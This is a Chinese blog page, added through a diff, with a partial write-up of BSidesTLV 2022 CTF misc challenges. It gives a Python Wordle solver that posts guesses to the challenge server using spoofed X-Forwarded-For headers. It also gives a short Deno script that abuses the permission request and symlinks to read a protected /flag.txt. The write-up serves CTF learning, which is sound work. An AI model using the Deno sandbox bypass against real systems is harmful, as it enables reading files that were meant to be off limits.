@@ -1,0 +1,717 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/maomao.png">
+  <link rel="icon" href="/img/maomao.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="k3">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Wordle出现过好多次的题了，基本上都是写脚本迅速解题，这题也不例外 先瞟个脚本 → https:&#x2F;&#x2F;github.com&#x2F;yotam-gafni&#x2F;wordle_solver 然后苏神的脚本循环发包 修改后come.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022-BsideTLVCTF-Misc-部分Wp">
+<meta property="og:url" content="https://www.imfengyuan.info/2022/06/27/20220627Bsides/index.html">
+<meta property="og:site_name" content="imK3">
+<meta property="og:description" content="Wordle出现过好多次的题了，基本上都是写脚本迅速解题，这题也不例外 先瞟个脚本 → https:&#x2F;&#x2F;github.com&#x2F;yotam-gafni&#x2F;wordle_solver 然后苏神的脚本循环发包 修改后come.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220627BSidesTLVCTF/Untitled.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220627BSidesTLVCTF/Untitled%201.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220627BSidesTLVCTF/Untitled%202.png">
+<meta property="article:published_time" content="2022-06-27T22:19:23.000Z">
+<meta property="article:modified_time" content="2022-06-27T22:20:23.000Z">
+<meta property="article:author" content="imfengyuan">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.imfengyuan.info/imgs/20220627BSidesTLVCTF/Untitled.png">
+  
+  
+  <title>2022-BsideTLVCTF-Misc-部分Wp - imK3</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.imfengyuan.info","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="imK3" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>K3&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/mao.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2022-BsideTLVCTF-Misc-部分Wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-27 22:19" pubdate>
+          2022年6月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          41 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2022-BsideTLVCTF-Misc-部分Wp</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年6月27日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="Wordle"><a href="#Wordle" class="headerlink" title="Wordle"></a>Wordle</h1><p>出现过好多次的题了，基本上都是写脚本迅速解题，这题也不例外</p>
+<p>先瞟个脚本 → <a target="_blank" rel="noopener" href="https://github.com/yotam-gafni/wordle_solver">https://github.com/yotam-gafni/wordle_solver</a></p>
+<p>然后苏神的脚本循环发包</p>
+<p>修改后come.py</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> m<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> lru_cache<br><br>@<span class="hljs-title function_">lru_cache</span>(maxsize=<span class="hljs-title class_">None</span>)<br>def <span class="hljs-title function_">calc_response_vector</span>(w1,w2):<br>	tw2 = w2<br>	msum = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">5</span>)]<br>	<span class="hljs-keyword">for</span> c_ind <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">5</span>):<br>		<span class="hljs-keyword">if</span> w1[c_ind] == tw2[c_ind]:<br>			msum[c_ind] = <span class="hljs-number">2</span><br>			tw2 = tw2[:c_ind] + <span class="hljs-string">&quot;*&quot;</span> + tw2[c_ind+<span class="hljs-number">1</span>:]<br>	<span class="hljs-keyword">for</span> c_ind <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">5</span>):<br>		<span class="hljs-keyword">if</span> w1[c_ind] <span class="hljs-keyword">in</span> tw2 and msum[c_ind] == <span class="hljs-number">0</span>:<br>			msum[c_ind] = <span class="hljs-number">1</span><br>			ind_app = tw2.<span class="hljs-title function_">find</span>(w1[c_ind])<br>			tw2 = tw2[:ind_app] + <span class="hljs-string">&quot;*&quot;</span> + tw2[ind_app+<span class="hljs-number">1</span>:]<br>	<span class="hljs-keyword">return</span> msum<br><br>client = m.<span class="hljs-title function_">M</span>()<br>client.<span class="hljs-title function_">init</span>()<br><span class="hljs-keyword">while</span> <span class="hljs-title class_">True</span>:<br>    f = <span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;words.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>    all_w = <span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;words.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>    lines = f.<span class="hljs-title function_">readlines</span>()<br>    all_lines = all_w.<span class="hljs-title function_">readlines</span>()<br>    count = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> round <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">6</span>):<br>        min_wc = <span class="hljs-number">100000</span><br>        chosen_word = <span class="hljs-string">&quot;&quot;</span><br>        srmat = &#123;&#125;<br>        <span class="hljs-keyword">if</span> round != <span class="hljs-number">0</span>:<br>            all_it = all_lines<br>        <span class="hljs-attr">else</span>:<br>            all_it = [<span class="hljs-string">&quot;crate&quot;</span>]<br>        <span class="hljs-keyword">for</span> w1 <span class="hljs-keyword">in</span> <span class="hljs-attr">all_it</span>:<br>            w1 = w1.<span class="hljs-title function_">strip</span>()<br>            mat = &#123;&#125;<br>            rmat = &#123;&#125;<br>            <span class="hljs-keyword">for</span> w2 <span class="hljs-keyword">in</span> <span class="hljs-attr">lines</span>:<br>                w2 = w2.<span class="hljs-title function_">strip</span>()<br>                msum = <span class="hljs-title function_">calc_response_vector</span>(w1,w2)<br>                <span class="hljs-keyword">if</span> <span class="hljs-title function_">tuple</span>(msum) not <span class="hljs-keyword">in</span> <span class="hljs-attr">rmat</span>:<br>                    rmat[<span class="hljs-title function_">tuple</span>(msum)] = [w2]<br>                <span class="hljs-attr">else</span>:<br>                    rmat[<span class="hljs-title function_">tuple</span>(msum)].<span class="hljs-title function_">append</span>(w2)<br>                mat[<span class="hljs-title function_">tuple</span>([w1,w2])] = msum<br><br>            M = <span class="hljs-title function_">max</span>([<span class="hljs-title function_">len</span>(val) <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> rmat.<span class="hljs-title function_">values</span>()])<br>            <span class="hljs-keyword">if</span> M &lt; <span class="hljs-attr">min_wc</span>:<br>                min_wc = M<br>                chosen_word = w1<br>                srmat = rmat<br><br>        <span class="hljs-title function_">print</span>(chosen_word)<br><br>        <span class="hljs-attr">try</span>:<br>            inp = m.<span class="hljs-title function_">convert</span>(client.<span class="hljs-title function_">send</span>(chosen_word))<br>            <span class="hljs-title function_">print</span>(inp)<br>            feedback = <span class="hljs-title function_">tuple</span>([<span class="hljs-title function_">int</span>(el) <span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> inp.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;,&quot;</span>)])<br>            lines = srmat[feedback]<br>        <span class="hljs-attr">except</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_">len</span>(lines) == <span class="hljs-number">1</span>:<br>            <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Done. Final word is &#123;&#125;&quot;</span>.<span class="hljs-title function_">format</span>(lines[<span class="hljs-number">0</span>]))<br>            client.<span class="hljs-title function_">send</span>(lines[<span class="hljs-number">0</span>])<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;Failed. Did not find word after 6 attempts&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>增加session发包类</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">M</span>:<br>    def <span class="hljs-title function_">__init__</span>(self):<br>        self.<span class="hljs-property">session</span> = requests.<span class="hljs-title function_">session</span>()<br><br>    def <span class="hljs-title function_">init</span>(self):<br>        burp0_url = <span class="hljs-string">&quot;https://wordle.ctf.bsidestlv.com:443/&quot;</span><br>        burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="hljs-string">&quot;document&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="hljs-string">&quot;navigate&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Site&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-User&quot;</span>: <span class="hljs-string">&quot;?1&quot;</span>, <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Originating-Ip&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Remote-Ip&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Remote-Addr&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;Te&quot;</span>: <span class="hljs-string">&quot;trailers&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<br>        self.<span class="hljs-property">session</span>.<span class="hljs-title function_">get</span>(burp0_url, headers=burp0_headers)<br><br>    def <span class="hljs-title function_">send</span>(self,content):<br>        burp0_url = <span class="hljs-string">&quot;https://wordle.ctf.bsidestlv.com:443/step&quot;</span><br>        burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;https://wordle.ctf.bsidestlv.com/&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;https://wordle.ctf.bsidestlv.com&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="hljs-string">&quot;empty&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="hljs-string">&quot;cors&quot;</span>, <span class="hljs-string">&quot;Sec-Fetch-Site&quot;</span>: <span class="hljs-string">&quot;same-origin&quot;</span>, <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Originating-Ip&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Remote-Ip&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;X-Remote-Addr&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;Te&quot;</span>: <span class="hljs-string">&quot;trailers&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<br>        burp0_json=&#123;<span class="hljs-string">&quot;guess&quot;</span>: content.<span class="hljs-title function_">upper</span>()&#125;<br>        res = self.<span class="hljs-property">session</span>.<span class="hljs-title function_">post</span>(burp0_url, headers=burp0_headers, json=burp0_json)<br>        <span class="hljs-title function_">print</span>(res.<span class="hljs-property">text</span>)<br>        <span class="hljs-keyword">if</span> res.<span class="hljs-title function_">json</span>().<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;status&#x27;</span>) == <span class="hljs-string">&quot;ok&quot;</span>:<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>().<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;result&#x27;</span>)<br>    <br>def <span class="hljs-title function_">convert</span>(content):<br>    s = []<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&quot;</span> == <span class="hljs-attr">content</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-attr">content</span>:<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;g&quot;</span>:<br>            s.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;2&#x27;</span>)<br>        elif i == <span class="hljs-string">&quot;.&quot;</span>:<br>            s.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;0&#x27;</span>)<br>        elif i == <span class="hljs-string">&quot;y&quot;</span>:<br>            s.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-title function_">join</span>(s)<br></code></pre></td></tr></table></figure>
+
+<h1 id="Jurassic-W0r1d"><a href="#Jurassic-W0r1d" class="headerlink" title="Jurassic W0r1d"></a>Jurassic W0r1d</h1><blockquote>
+<p> 给了一个没有读取权限的Deno Playground 从来没见过…</p>
+</blockquote>
+<p>兜兜转转还是得认认真真的看GIthub的issues</p>
+<p>先是看到了symlink<a target="_blank" rel="noopener" href="https://github.com/denoland/deno/pull/12154">https://github.com/denoland/deno/pull/12154</a></p>
+<p><img src="/../imgs/20220627BSidesTLVCTF/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>猜测symlink可以越权读取文件</p>
+<p>测试了一下发现必须要有写的权限没有可写路径，然后找了一下有没有可以写入的权限</p>
+<p>之前测试了一下一些Deno的基本函数，发现cwd可以看到当前会话的临时目录，临时目录还是写不了，</p>
+<p>认认真真看issues，看到了这个<a target="_blank" rel="noopener" href="https://github.com/denoland/deno/issues/14668">https://github.com/denoland/deno/issues/14668</a></p>
+<p><img src="/../imgs/20220627BSidesTLVCTF/Untitled%201.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>总的来说，可以越权获得写入缓存的权限，测试了一下这个函数可以</p>
+<p>exp</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> cwd = <span class="hljs-title class_">Deno</span>.<span class="hljs-title function_">cwd</span>();<br><span class="hljs-keyword">const</span> desc1 = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;write&quot;</span>, <span class="hljs-attr">path</span>: cwd &#125; ;<br><span class="hljs-keyword">const</span> status1 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Deno</span>.<span class="hljs-property">permissions</span>.<span class="hljs-title function_">request</span>(desc1);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(status1);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\n[*] listing files from /\n&quot;</span>);<br><span class="hljs-keyword">await</span> <span class="hljs-title class_">Deno</span>.<span class="hljs-title function_">symlink</span>(<span class="hljs-string">&quot;/flag.txt&quot;</span>, cwd+<span class="hljs-string">&quot;/hacker2.txt&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">await</span> <span class="hljs-title class_">Deno</span>.<span class="hljs-title function_">readTextFile</span>(cwd+<span class="hljs-string">&quot;/hacker2.txt&quot;</span>));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/20220627BSidesTLVCTF/Untitled%202.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctfwp/" class="category-chain-item">ctfwp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2022-BsideTLVCTF-Misc-部分Wp</div>
+      <div>https://www.imfengyuan.info/2022/06/27/20220627Bsides/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>k3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月27日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            BY K3
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/28/20220628ACTF/" title="2022-ACTF-Misc-部分Wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2022-ACTF-Misc-部分Wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/25/20220619CICSNHDB/" title="2022-CICSN华东北-Web/Re/Misc-部分Wp">
+                        <span class="hidden-mobile">2022-CICSN华东北-Web/Re/Misc-部分Wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
